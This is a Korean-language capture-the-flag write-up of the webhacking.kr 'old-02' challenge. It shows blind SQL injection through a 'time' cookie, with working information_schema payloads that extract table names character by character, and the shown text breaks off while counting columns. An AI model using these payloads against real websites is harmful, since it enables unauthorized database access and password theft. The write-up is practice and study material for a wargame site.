# [webhacking]old-02

https://webhacking.kr/

https://power-girl0-0.tistory.com/490

https://poci.tistory.com/100

https://wisdom-990629.tistory.com/entry/Webhackingkr-old-02%EB%B2%88-%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4

<br>

![](../img/Study%20Img/%5Bwebhacking%5Dold-02%20-%201.png)

아무것도 없는 글만 있는 페이지이다. 클릭도 없고 뭐도 없다.

개발자 도구(F12)를 이용해 쿠키를 보겠다. time 쿠키 값이 있다.

![](../img/Study%20Img/%5Bwebhacking%5Dold-02%20-%202.png)

HTML 코드를 보자.

![](../img/Study%20Img/%5Bwebhacking%5Dold-02%20-%203.png)

여기서 주석 문구에 힌트가 있는거 같다. 두 가지의 힌트를 얻을 수 있다.

admin.php 페이지 유추, time 쿠키와 관련되어 있어보이는 날짜 값

```html
<!--
2022-12-08 09:39:27
-->

<!-- if you access admin.php i will kick your ass -->
```

admin.php 페이지에 접속이 된다.

패스워드 입력 창이 나온다.

SQL Injection, XSS 등등 공격을 해봤지만 되지 않는다.

날짜 값을 확인해봐야 겠다.

![](../img/Study%20Img/%5Bwebhacking%5Dold-02%20-%204.png)

쿠키 값에 바꿔봤더니 값에 따라 쿠키 값이 바뀐다.

```html
time=1
>>>
<!--
2070-01-01 09:00:01
-->

time=2
>>>
<!--
2070-01-01 09:00:02
-->
```

blind sql 공격 구문 입력했다.

blind sql 공격이 성공 하는 모습. 참이면 1 거짓이면 0이 된다.

blind sql로 데이터베이스 값을 추출해 패스워드까지 알아보겠다.

~~union, error based 다 안되더라~~

```html
time=2 and 1=1
>>>
<!--
2070-01-01 09:00:01
-->

time=1 and 1=1
>>>
<!--
2070-01-01 09:00:01
-->

time=2 and 1=0
>>>
<!--
2070-01-01 09:00:00
-->
```

테이블명 알아내기 - 테이블 갯수 구하기

테이블 수는 2개 확인

```html
time=(select count(table_name) from information_schema.tables where table_schema=database())
>>>
<!--
2070-01-01 09:00:02
-->
```

테이블명 알아내기 - 각각 테이블 길이 구하기

각각 13, 3 의 길이

```html
time=(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)
>>>
<!--
2070-01-01 09:00:13
-->

time=(select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)
>>>
<!--
2070-01-01 09:00:3
-->
```

테이블명 알아내기 - 각각 테이블 명 추출, 아스키코드 값으로

이런식으로 하나 씩 늘려가면서 다 찾아본다. 귀찮다면 파이썬 스크립트를 만들어도 되고 나는 할줄 몰라서 버프의 intruder를 이용했다.


```html
time=(select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)
>>>
<!--
2070-01-01 09:01:37
-->

time=(select ascii(substr(table_name,2,1)) from information_schema.tables where table_schema=database() limit 0,1)
>>>
<!--
2070-01-01 09:01:40
-->
```

![](../img/Study%20Img/%5Bwebhacking%5Dold-02%20-%205.png)

그렇게 나온 아스키 코드 값을 변환해주면

각각 admin_area_pw, log 가 나온다.

이렇게 테이블 명을 구했다.

```
97 100 109 105 110 95 97 114 101 97 95 112 119
>>>
admin_area_pw

108 111 103
>>>
log
```

컬럼 명 구하기 - 컬럼 갯수 구하기

패스워드는 admin 테이블에 있을거 같으니 먼저 했다.

```html
test=(select count(column_name) from information_schema.columns where table_name='admin_area_pw')
>>>
<!--
2070-01-01 09:00:01
-->
```